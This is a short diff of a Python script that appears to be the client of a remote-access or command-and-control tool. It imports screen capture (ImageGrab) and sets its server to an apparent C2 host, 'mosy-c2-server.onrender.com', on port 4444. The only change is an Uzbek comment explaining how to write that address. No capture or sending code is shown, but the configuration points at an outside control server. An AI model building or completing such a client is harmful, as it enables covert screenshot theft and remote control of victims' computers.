@@ -5,6 +5,7 @@ import os
 import platform
 from PIL import ImageGrab
 
+# Render'dagi server manzili (https:// va oxirgi / siz)
 SERVER_HOST = 'mosy-c2-server.onrender.com'
 SERVER_PORT = 4444
 
